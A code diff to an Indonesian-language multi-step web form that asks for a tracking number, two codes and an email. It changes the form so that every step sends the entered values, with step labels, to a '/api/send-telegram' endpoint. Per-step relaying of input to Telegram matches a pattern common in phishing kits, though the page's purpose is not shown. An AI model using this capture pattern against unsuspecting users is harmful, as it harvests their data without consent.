@@ -128,8 +128,37 @@ function validate(){
   if(current===2&&!value('kode2'))err.textContent='Masukkan kode referensi produk untuk melanjutkan.';
   return !err.textContent;
 }
-function nextStep(){if(validate())showStep(current+1)}
-function prevStep(){showStep(Math.max(0,current-1))}
+  async function notifyTelegram(action){
+    const response=await fetch('/api/send-telegram',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        resi:value('resi'),
+        kode1:value('kode1'),
+        kode2:value('kode2'),
+        email:value('email'),
+        step:current+1,
+        action
+      })
+    });
+    if(!response.ok)throw new Error('Telegram request failed');
+  }
+  async function nextStep(){
+    if(!validate())return;
+    const button=steps[current].querySelector('.primary');
+    if(button){button.disabled=true;button.textContent='Menyimpan...'}
+    try{
+      await notifyTelegram('Selanjutnya');
+      showStep(current+1);
+    }catch{
+      const err=document.getElementById('err'+current);
+      err.textContent='Data belum berhasil dikirim. Silakan coba lagi.';
+    }finally{
+      if(button){button.disabled=false;button.textContent='Selanjutnya'}
+    }
+  }
+  function prevStep(){showStep(Math.max(0,current-1))}
+
 async function finish(){
   const err=document.getElementById('err3');
   const notice=document.getElementById('submitNotice');
@@ -145,7 +174,7 @@ async function finish(){
     const response=await fetch('/api/send-telegram',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({resi:value('resi'),kode1:value('kode1'),kode2:value('kode2'),email:value('email')})
+      body:JSON.stringify({resi:value('resi'),kode1:value('kode1'),kode2:value('kode2'),email:value('email'),step:5,action:'Kirim formulir lengkap'})
     });
     if(!response.ok) throw new Error('Telegram request failed');
     showStep(4);
